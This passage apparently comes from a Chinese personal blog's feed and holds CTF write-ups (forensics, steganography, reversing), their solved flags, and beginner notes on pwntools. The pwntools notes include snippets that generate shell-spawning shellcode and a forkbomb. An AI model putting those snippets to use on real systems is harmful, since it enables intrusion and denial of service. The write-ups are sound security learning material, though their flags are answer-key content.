src="https://img-blog.csdnimg.cn/20210221173752327.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后拖到linus虚拟机中，strings打印一下，发现了一些有用的数据，不过估计这样子行不通。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings f1fc23f5c743425d9e0073887c846d23 | grep flag</span><br></pre></td></tr></table></figure><p>这个命令就是搜索该文件中的带flag的内容。<img src="https://img-blog.csdnimg.cn/20210221174543346.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ext3grep f1fc23f5c743425d9e0073887c846d23 --restore-all</span><br></pre></td></tr></table></figure><p>这是个办法，是可以找到flag的。还需要一个base64解码。<br>还可以挂载</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount f1fc23f5c743425d9e0073887c846d23 &#x2F; mnt</span><br></pre></td></tr></table></figure><p>这样子也是可以的，找了很多大佬的，发现这道题的做法有很多，这里补充一下，有一种错误的做法，就是使用foremost这个命令，会得到一张flag的图片，但那个flag是个错误的flag。<br><strong>flag{sajbcibzskjjcnbhsbvcjbjszcszbkzj}</strong></p><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><p>ext3grep是ext3文件系统的数据恢复工具，这道题是需要下载这个软件的。但是我下载的时候<img src="https://img-blog.csdnimg.cn/20210221175258749.png" alt="在这里插入图片描述"><br>mount是挂载的命令。</p><hr /><h1 id="stegano"><a href="#stegano" class="headerlink" title="stegano"></a>stegano</h1><p>这是个pdf的格式，以前还没碰过这种的misc。<br>这里用notepad++打开：<br><img src="https://img-blog.csdnimg.cn/2021022118064737.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后我就用火狐打开：<br><img src="https://img-blog.csdnimg.cn/20210221180914616.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这时我们就可以复制粘贴到txt上，就会发现有一串密文啦，这里也可以按下F12进入控制台，输入 <strong>document.documentElement.textContent</strong> ，这样子去查看里面的文字啦。<img src="https://img-blog.csdnimg.cn/20210221181316590.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后我们进行解密就可以了：<br><strong><em>flag{1nv151bl3m3554g3}</em></strong></p><hr /><h1 id="SimpleRAR"><a href="#SimpleRAR" class="headerlink" title="SimpleRAR"></a>SimpleRAR</h1><p>这里提示说用到PS，哎讨厌，我不会呀！！！<br>是个rar压缩包，我们就解压:<br><img src="https://img-blog.csdnimg.cn/20210221181711144.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>用winhex查看，不过到期了，也没弄破解的，用101 Editor这个吧，这个也是可以的，免费的。<br>还有一点就是，这里winrar会报错，但依然会有个文件出现，里面有个txt文档，不过不是flag了。<img src="https://img-blog.csdnimg.cn/20210222155550967.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>此时便能正常打开了。<img src="https://img-blog.csdnimg.cn/20210222155711717.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>打开是两张图片，我们便修改它为gif看看动图是什么：<br><img src="https://img-blog.csdnimg.cn/20210222160239678.png" alt="在这里插入图片描述"><br>此时要用一个GifSplitter这个软件来分离两张图片：<img src="https://img-blog.csdnimg.cn/20210222161446683.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后就用工具拼好它：<br><img src="https://img-blog.csdnimg.cn/2021022216193236.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>哎！还是不细心，差了一个角，那就再补上去：<br><img src="https://img-blog.csdnimg.cn/20210222162044926.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong><em>flag{yanji4n_bu_we1shi}</em></strong><br>我没有用PS，毕竟我还不太会用，我用的是Setuna这个截屏软件，截下来再拼接好就能扫开二维码了。<br>嗯，不错！又接触了一个软件，一题一软件，哈哈。</p><hr /><h1 id="base64stego"><a href="#base64stego" class="headerlink" title="base64stego"></a>base64stego</h1><p>hint提示好像有关如来十三掌有关。<img src="https://img-blog.csdnimg.cn/20210222162712899.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70"><br>查看一下十六进制，看看文件头是个什么东东：<br><img src="https://img-blog.csdnimg.cn/20210222163123413.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ol><li><strong>无加密</strong><br>压缩源文件数据区的全局加密应当为00 00<br>且压缩源文件目录区的全局方式位标记应当为00 00</li><li><strong>假加密</strong><br>压缩源文件数据区的全局加密应当为00 00<br>且压缩源文件目录区的全局方式位标记应当为09 00</li><li><strong>真加密</strong><br>压缩源文件数据区的全局加密应当为09 00<br>且压缩源文件目录区的全局方式位标记应当为09 00<br><img src="https://img-blog.csdnimg.cn/20210222163332156.png" alt="在这里插入图片描述"><br>修改它为0就可以了，这里是文件尾，要与文件头相互对应起来。<br>里面有个txt的文档，我们打开发现每一行后面都有==，说明它应该是base64加密，代码还是不会写，如果一行一行弄的话，是会弄出来的，但太麻烦了。所以这里就不弄代码了。</li></ol><p><strong><em>flag{Base_sixty_four_point_five}</em></strong></p><hr /><h1 id="功夫再高也怕菜刀"><a href="#功夫再高也怕菜刀" class="headerlink" title="功夫再高也怕菜刀"></a>功夫再高也怕菜刀</h1><p>PCAPNG是PCAP Next Generation Dump File Format的缩写，意思是PCAP下一代文件格式，后缀名为.pcapng。<br>发现是pcapng后缀名，其实就是各种数据包了。<br>此时我们再介绍一个软件： <strong><em>Wireshark</em></strong> （前称Ethereal）是一个网络封包分析软件。网络封包分析软件的功能是撷取网络封包，并尽可能显示出最为详细的网络封包资料。Wireshark使用WinPCAP作为接口，直接与网卡进行数据报文交换。<br>这道题说实话确实有点难。<img src="https://img-blog.csdnimg.cn/20210223110115534.png" alt="在这里插入图片描述"><br>我们基本都能想道数据分析，但是去foremost它比较难想到（个人柑橘）<img src="https://img-blog.csdnimg.cn/2021022311032193.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>Wireshark</strong> 我们此时用此软件打开它，去分析它。<img src="https://img-blog.csdnimg.cn/20210223111015792.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后找一找：<br><img src="https://img-blog.csdnimg.cn/2021022311103266.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>到这里看了一下其它大师傅的博客，都说追踪一下TCP流就可以看到了一张图片的十六进制，然后到winhex里面把图片复原出来就是密码了，不过我还是没弄成，我到追踪这就卡了。唉唉！</p><!--音乐--><div style="position:abolute; bottom:100px; left:0px; width:50%"> <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1817446773&auto=1&height=66"></iframe></div> <!--动态线条背景--><script type="text/javascript"color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>]]></content>
      
      
      <categories>
          
          <category> 个人博客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>reverse-for-the-holy-grail-350 &amp; tt3441810 &amp; re2-cpp-is-awesome</title>
      <link href="posts/9ce1c7f1/"/>
      <url>posts/9ce1c7f1/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="reverse-for-the-holy-grail-350"><a href="#reverse-for-the-holy-grail-350" class="headerlink" title="reverse-for-the-holy-grail-350"></a>reverse-for-the-holy-grail-350</h1><p>打开，发现是用C++写的，在攻防世界里面，越往后越是用的C++。<br><img src="https://img-blog.csdnimg.cn/20210215094828604.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>userIn这个是个字符串要用到。qword_601AE8也是个。但是这里仔细看发现是不能够得到flag的。所以我们往上看，去找找我们要的。<img src="https://img-blog.csdnimg.cn/20210215095727109.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>此时我们就要去看看这个函数了，它里面有三个数组了。分析来看，v4是一个关键，不能为负值。<br>stringMod：<br><img src="https://img-blog.csdnimg.cn/20210215102409383.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>上面的无法完全找到，所以：<img src="https://img-blog.csdnimg.cn/2021021511064550.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>再来看看下面的：<br><img src="https://img-blog.csdnimg.cn/20210215110831341.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>此时我们就可以开始写脚本了，由下向上的开始吧。但是这样子不好写，而且它也并非是线性关系，而是这个三个数组负责不同的位数。<br>脚本：<br><img src="https://img-blog.csdnimg.cn/20210215114850840.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>此时我们再来分析一下代码，因为这个思路可能比较难理解这个脚本。<br><strong><em>此时我们假如输入的是flag了，它们会进入stringMod这个关键函数，而里面有三个数组《firstchar   thirdchar   masterArray》这三个。然后首先要对3的倍数进行核对（0，3，6….）然后有个必经的循环（上面提到过），此时说明下两个数组要经过这个加密：</em></strong></p><p><img src="https://img-blog.csdnimg.cn/20210215122526814.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>有难点，不过还是能够做出来的。</p><hr /><h1 id="tt3441810"><a href="#tt3441810" class="headerlink" title="tt3441810"></a>tt3441810</h1><p>这道题我首先用ida打开，发现是不行的，所以我们就EP探测下，看看<img src="https://img-blog.csdnimg.cn/20210217115057607.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>其实到这里我有点想用linus系统去查看这个文件（因为windows系统是根据后缀明来判断文件的）后来发现它是个txt的，就是个数据，从这些数据里面发现一些我要的flag。<br><strong>柑橘它不该分到re，应该是mics或crypto</strong><br><img src="https://img-blog.csdnimg.cn/20210217121626501.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后就解出来了，不过这个还有些其它的干扰字符，如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hflHH4$HHhagHH4$HHh&#123;pHH4$HHhopHH4$HHhpoHH4$HHhprHH4$HHhetHH4$HHh&#125;HH4$HHH1H&lt;</span><br></pre></td></tr></table></figure><p>HH4$HH这个应该是干扰的，还有h这个也是个干扰项，最后提交的时候还不行，必须把flag{}这个去掉，即 <strong><em>poppopret</em></strong></p><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><p>这个主要考察我们去分析文件（以二进制来），这样我们就需要去除一些干扰的字符，去找到我们想要的数据（data层）</p><hr /><h1 id="re2-cpp-is-awesome"><a href="#re2-cpp-is-awesome" class="headerlink" title="re2-cpp-is-awesome"></a>re2-cpp-is-awesome</h1><p>这道题有个提示：<br><img src="https://img-blog.csdnimg.cn/20210217122437334.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>应该就是C++的逆向了，不过C++的逆向必须要精简代码一下，这样子才好分析了：<br><img src="https://img-blog.csdnimg.cn/2021021712354062.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这个关键的判断，有几个关键的地方，off_6020A0和dword_6020C0这个。然后去追踪一下，找到这两个数组的内容就好了。<br><strong>align 8</strong> 就是8个字节对齐，在这里就是间隔了8个0，就是这里还有一个0的意思：<br><img src="https://img-blog.csdnimg.cn/20210217125146213.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后就写出脚本了。</p><h3 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h3><p>其实这道题也没什么要讲的，主要是熟悉一下C++写的脚本。</p><!--音乐--><div style="position:abolute; bottom:100px; left:0px; width:50%"> <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1397903360&auto=1&height=66"></iframe></div> <!--动态线条背景--><script type="text/javascript"color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>]]></content>
      
      
      <categories>
          
          <category> 个人博客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>二哈学习pwn-2</title>
      <link href="posts/f6542900/"/>
      <url>posts/f6542900/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h1><p>嗯，本来想直接上题，但是题解还是没有整理好，所以此次我们详细介绍一下pwntools，我所用的是python3版本，python2版本比较老旧，而且已经不更新了，所以我们来介绍一下pwntools里的语句。<br>首先要说的是python3里的bytes和str有了区别，而在python2里没有区别，所以说python2里的脚本到python3里会报错。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">bytes object---&gt;b &#x3D; b&quot;example&quot;</span><br><span class="line">str object---&gt;s &#x3D; “example”</span><br><span class="line">str to bytes---&gt;bytes(s, encoding &#x3D; “utf8”)</span><br><span class="line">bytes to str---&gt;str(b, encoding &#x3D; “utf-8”)</span><br><span class="line">str to bytes---&gt;str.encode(s)</span><br><span class="line">bytes to str---&gt;bytes.decode(b)</span><br></pre></td></tr></table></figure><p>这里列举了python3里的bytes和str转换。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">12345</span>)</span><br><span class="line"><span class="comment"># 与互联网主机交互</span></span><br><span class="line">io.sendline(<span class="string">&quot;hello&quot;</span>)</span><br><span class="line">io.send(<span class="string">&quot;hello&quot;</span>)</span><br><span class="line"><span class="comment"># sendline发送数据会在最后多添加一个回车</span></span><br><span class="line">io.recv(<span class="number">1024</span>)</span><br><span class="line">io.revuntil()</span><br><span class="line">io.recvline(<span class="string">&quot;hello&quot;</span>)</span><br><span class="line"><span class="comment"># recv()读取1024个字节，recvline()会读取一直到回车，recvuntil()读取到指定数据</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>还有一个点，就是有时用context这个进行调试</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"><span class="comment"># 设置成debug，pwntools会将所有io数据等输出，方便编写poc的时候进行调试，而arch可以设置攻击目标的指令构架</span></span><br></pre></td></tr></table></figure><p>还有shellcode生成器，这就先不说了，到时候用题进行说明。<br>asm可以进行汇编，而disasm可以进行反汇编<br>==注意== ，asm需要binutils中的as工具辅助，如果是不同于本机平台的其他平台的汇编，例如在我的x86机器上进行mips的汇编就会出现as工具未找到的情况，这时候需要安装其他平台的cross-binutils。<br>整数pack与数据unpack</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pack：p32，p64<span class="comment">#这个经常使用</span></span><br><span class="line">unpack：u32，u64</span><br></pre></td></tr></table></figure><p>暂时介绍这些，只是对函数进行一些整理，防止忘记！</p><!--音乐--><div style="position:abolute; bottom:100px; left:0px; width:50%"> <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1450265949&auto=1&height=66"></iframe></div> <!--动态线条背景--><script type="text/javascript"color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>]]></content>
      
      
      <categories>
          
          <category> 个人博客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>像二哈一样学习pwn</title>
      <link href="posts/85c5cdca/"/>
      <url>posts/85c5cdca/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="第一天"><a href="#第一天" class="headerlink" title="第一天"></a>第一天</h1><p>其实也不算是第一天接触pwn，但写pwn文章算是第一天吧！<br>我们要一点一点的去接触各种的二进制漏洞，一点一点学习pwn，说不定那天我们就能入侵别人的电脑了（哈哈）</p><h2 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h2><p>我们先来看看payload，就是pwn常用的一些函数，毕竟我们最常用到了就是这些了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">32152</span>)</span><br><span class="line"><span class="comment"># 与互联网主机交互</span></span><br><span class="line">io.sendline(<span class="string">&quot;hello&quot;</span>)</span><br><span class="line">io.send(<span class="string">&quot;hello&quot;</span>)</span><br><span class="line"><span class="comment"># sendline发送数据会在最后多添加一个回车</span></span><br><span class="line">io.recv(<span class="number">1024</span>)</span><br><span class="line">io.revuntil()</span><br><span class="line">io.recvline(<span class="string">&quot;hello&quot;</span>)</span><br><span class="line"><span class="comment"># recv()读取1024个字节，recvline()会读取一直到回车，recvline()读取到指定数据</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">io = process(<span class="string">&quot;./bin&quot;</span>, shell=<span class="literal">True</span>)</span><br><span class="line"><span class="comment">#启动本地程序进行交互，用于gdb调试</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">io.p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">io.p64(<span class="number">0xdeadbeefdeadbeef</span>)</span><br><span class="line">io.u32(<span class="string">&quot;1234&quot;</span>)</span><br><span class="line">io.u64(<span class="string">&quot;12345678&quot;</span>)</span><br><span class="line"><span class="comment"># 将字节数组与数组进行以小端对齐的方式相互转化，32负责转化dword，64负责转化qword</span></span><br></pre></td></tr></table></figure><p>此时我们来看下上什么叫小端对齐：</p><p>高内存地址放整数的高位，低内存地址放整数的低位，这种方式叫倒着放，术语叫小端对齐。电脑X86和手机ARM都是小端对齐的。高内存地址放整数的低位，低内存地址放整数的高位，这种方式叫正着放，术语叫大端对齐。很多Unix服务器的cpu都是大端对齐的。</p><p>嗯，接下来我们再来看看其它的模块（有时候用到）：</p><h3 id="Pwnlib-asm"><a href="#Pwnlib-asm" class="headerlink" title="Pwnlib.asm"></a>Pwnlib.asm</h3><p>Asm模块主要通过capstone进行汇编的编译和反编译。通常用来编译各种平台构架的shellcode。</p><h3 id="Pwnlib-constants"><a href="#Pwnlib-constants" class="headerlink" title="Pwnlib.constants"></a>Pwnlib.constants</h3><p>头文件宏定义的封装，通过此模块，可以直接获取一下系统宏定义对应的整数数据。</p><h3 id="Pwnlib-context"><a href="#Pwnlib-context" class="headerlink" title="Pwnlib.context"></a>Pwnlib.context</h3><p>上下文管理器，通过他来控制一些全局的信息。比如目标计算机体系结构，log等级等。控制生成shellcode，log时候的默认行为。</p><h3 id="Pwnlib-dynelf"><a href="#Pwnlib-dynelf" class="headerlink" title="Pwnlib.dynelf"></a>Pwnlib.dynelf</h3><p>通过内存leak数据来自动化定位程序中函数位置。及其实用。</p><h3 id="Pwnlib-encoders"><a href="#Pwnlib-encoders" class="headerlink" title="Pwnlib.encoders"></a>Pwnlib.encoders</h3><p>Shellcode编码工具，通过编码排除shellcode中的特殊字符，防止无法转化。</p><h3 id="Pwnlib-elf"><a href="#Pwnlib-elf" class="headerlink" title="Pwnlib.elf"></a>Pwnlib.elf</h3><p>读写elf文件结构中的各种信息。非常方便实用。</p><h3 id="Pwnlib-fmtstr"><a href="#Pwnlib-fmtstr" class="headerlink" title="Pwnlib.fmtstr"></a>Pwnlib.fmtstr</h3><p>格式化字符串自动化利用工具。有缺陷，只能使用少数情况。</p><h3 id="Pwnlib-gdb"><a href="#Pwnlib-gdb" class="headerlink" title="Pwnlib.gdb"></a>Pwnlib.gdb</h3><p>可以在脚本中直接使用此模块attach进程或者启动gdb</p><h3 id="Pwnlib-libcdb"><a href="#Pwnlib-libcdb" class="headerlink" title="Pwnlib.libcdb"></a>Pwnlib.libcdb</h3><p>Libc的database，可以通过一些信息查找对应libc</p><h3 id="Pwnlib-log"><a href="#Pwnlib-log" class="headerlink" title="Pwnlib.log"></a>Pwnlib.log</h3><p>通常是pwntools内部代码使用</p><h3 id="Pwnlib-memleak"><a href="#Pwnlib-memleak" class="headerlink" title="Pwnlib.memleak"></a>Pwnlib.memleak</h3><p>内存泄漏管理工具，方便拼接多次泄露出来的内存。</p><h3 id="Pwnlib-shellcraft"><a href="#Pwnlib-shellcraft" class="headerlink" title="Pwnlib.shellcraft"></a>Pwnlib.shellcraft</h3><p>Shellcode生成工具</p><h3 id="Pwnlib-tubes"><a href="#Pwnlib-tubes" class="headerlink" title="Pwnlib.tubes"></a>Pwnlib.tubes</h3><p>主要的io工具</p><h3 id="Pwnlib-util"><a href="#Pwnlib-util" class="headerlink" title="Pwnlib.util"></a>Pwnlib.util</h3><p>包含一些列有效的小工具</p><h3 id="Pwnlib-rop"><a href="#Pwnlib-rop" class="headerlink" title="Pwnlib.rop"></a>Pwnlib.rop</h3><p>rop生成工具，可以直接生成32位rop</p><h2 id="shellcraft-amp-asm"><a href="#shellcraft-amp-asm" class="headerlink" title="shellcraft&amp;asm"></a>shellcraft&amp;asm</h2><p>pwntools的shellcraft主要用来生成汇编代码形式的shellcode,而asm的作用是根据汇编代码编译出二进制shellcode。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 生成执行sh的shellcode并编译</span></span><br><span class="line">asm(pwnlib.shellcraft.thumb.linux.sh(), arch=<span class="string">&quot;thumb&quot;</span>)</span><br><span class="line"><span class="comment"># 可以将thumb换成对应cpu</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 读取flag并输出到标准输出</span></span><br><span class="line">pwnlib.shellcraft.i386.linux.cat(<span class="string">&quot;flag&quot;</span>, fd=<span class="number">1</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用forkbomb破坏系统（慎用）</span></span><br><span class="line">pwnlib.shellcraft.i386.linux.forkbomb()</span><br></pre></td></tr></table></figure><h2 id="context"><a href="#context" class="headerlink" title="context"></a>context</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"><span class="comment"># 